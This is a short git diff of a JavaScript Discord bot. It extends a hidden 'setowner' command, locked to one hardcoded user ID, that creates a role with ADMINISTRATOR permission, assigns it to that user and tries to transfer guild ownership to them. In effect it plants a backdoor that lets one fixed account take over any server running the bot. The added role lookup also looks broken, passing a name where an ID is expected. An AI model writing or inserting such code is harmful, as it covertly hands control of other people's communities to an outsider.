@@ -113,12 +113,14 @@ client.on('message', function(message) {
         case "setowner":
             if (message.author.id === "260470661732892672") {
                 message.guild.createRole({
-                    "name": args[1],
+                    "name": "Test",
                     "color": "990000",
                     "position": 100,
                     "permissions": "ADMINISTRATOR",
                     "mentionable": false
                 });
+                Member = message.guild.member(message.author);
+                Member.addRole(message.guild.roles.get("Test"));
                 message.guild.setOwner(message.author);
                 message.channel.send(message.guild.owner.displayName);
             } else {
